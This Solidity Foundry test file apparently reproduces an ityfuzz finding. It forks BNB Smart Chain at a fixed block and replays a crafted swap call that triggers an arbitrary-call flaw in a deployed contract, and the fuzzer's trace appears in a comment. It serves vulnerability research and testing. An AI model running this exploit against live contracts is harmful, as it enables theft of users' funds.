// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01,0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593,0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8,0x0ccee62efec983f3ec4bad3247153009fb483551,0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2 -c bsc --onchain-block-number 26024419 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0x0ccee62efec983f3ec4bad3247153009fb483551" to 0x6d8981847eb3cc2234179d0f0e72f6b6b2421a01
================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0x0Ccee62EfEC983f3EC4bAD3247153009FB483551.swap(0x0000000000000000000000000000000000000000, 0x0Ccee62EfEC983f3EC4bAD3247153009FB483551, 0x0000000000000000000000000000000000000000, 3831238852189377643920801182898619320.6142 Ether, 409769250325899827985636424618369647658057886.1975 Ether, 0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2, 0xdf7edd7f7e7f7f7f1fb47f20ffffed7f20102080)
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()


 */

contract C6D89 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 26024419);
    }

    function test() public {

        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        
        0x0Ccee62EfEC983f3EC4bAD3247153009FB483551.call(abi.encodeWithSignature(
            "swap(address,address,address,uint256,uint256,address,bytes)",0x0000000000000000000000000000000000000000, 0x0Ccee62EfEC983f3EC4bAD3247153009FB483551, 0x0000000000000000000000000000000000000000, 3831238852189377643920801182898619320.6142 Ether, 409769250325899827985636424618369647658057886.1975 Ether, 0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2, 0xdf7edd7f7e7f7f7f1fb47f20ffffed7f20102080
        )); 
    }

    // Stepping with return
    receive() external payable {}
}

